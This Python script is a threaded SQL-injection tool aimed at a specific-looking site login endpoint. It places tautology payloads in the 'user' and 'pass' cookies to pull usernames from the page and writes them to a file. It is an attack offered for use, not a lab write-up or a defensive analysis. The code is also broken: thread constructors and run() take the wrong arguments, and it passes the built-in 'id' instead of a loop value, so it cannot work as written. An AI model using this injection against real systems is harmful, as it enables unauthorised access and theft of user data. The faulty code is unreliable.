from re import search
import threading
from requests import get,post


# Define the target url. 
url="https://host.vn/user"

def find(id):
    
    global url
    cookies={'user':" 'OR id = '"+id+ "' AND 1='1",'pass':"hihihi'OR 'ySGF'='ySGF"}
    # data= "username="+user+"&password="+pwd
    x = get(url,cookies=cookies)
    if x.status_code == 500:
        return False
    user=search('class="form-control" value="(.*?)"',x.text)

    if user != None :
        with open('python-script/found.txt','a') as f:
            f.write(user.group(1)+"\n")
        return False
    else:
        return True

def start(port):
    for i in range(port) :
        myThread(int(i)+1,int(i) ,port).start()



class myThread (threading.Thread):
    def __init__(self, threadID,port):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.port= port
    def run(self,port):
        self._process(self.threadID,port=port)

    def _process(self,ID,port):
        counter= ID + port
        while  True:
            try:
                find(id)
                counter+=port
            except:
                print("eroor")
                break
#starting program
## port is the number of threads will running. As many port as faster but too many can drop the network and load balance and producing error.
start(port=3)

